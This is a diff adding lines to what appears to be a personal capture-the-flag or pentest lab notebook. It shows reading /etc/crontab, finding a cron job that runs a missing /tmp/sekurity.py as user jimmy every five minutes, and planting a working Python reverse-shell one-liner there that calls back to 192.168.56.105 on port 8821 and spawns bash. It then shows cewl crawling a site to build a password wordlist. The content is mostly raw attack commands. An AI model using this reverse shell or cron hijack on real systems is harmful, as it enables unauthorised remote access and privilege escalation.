@@ -145,8 +145,26 @@ secret password :
 WELCOME ! 
 martin@debian:~$ 
 
+cat /etc/crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/5   * * * *   jimmy   python /tmp/sekurity.py
+
+//under .tmp , no se file, so we create a reverse shell there. then listen on the host
+martin@debian:/tmp$ cat sekurity.py 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.105",8821));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 
 
+
+
+
+*********************************************************************************
 #crawl a psswd list,source from a web packages
 └─$ cewl -m 5 -o http://172.16.85.132/ -w rawpass.txt  #-m mini length
 CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
